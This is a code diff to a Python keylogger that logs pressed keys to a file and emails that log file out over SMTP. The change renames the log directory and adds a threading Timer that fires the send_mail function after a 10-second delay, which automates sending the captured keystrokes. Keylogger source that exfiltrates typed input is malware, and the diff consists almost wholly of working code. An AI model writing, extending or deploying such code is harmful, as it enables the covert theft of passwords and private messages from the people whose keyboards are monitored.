@@ -8,9 +8,13 @@ from email.mime.base import MIMEBase
 from email import encoders
 import smtplib
 
+# threading to delay the send_mail function
+from threading import Timer
+
 # global variables
-filepath = "/home/dave/Documents/KEYLOGGER/"
+filepath = "/home/dave/Documents/keylogger/"
 keyfile = "log.txt"
+timer_delay = 10
 
 
 # Function to send the log file via email
@@ -70,6 +74,11 @@ def send_mail():
     
     # terminating the session
     s.quit()
+
+
+# Delay send_mail function
+timer = Timer(timer_delay, send_mail)
+timer.start()
 
 
 # Function to get and log pressed keys
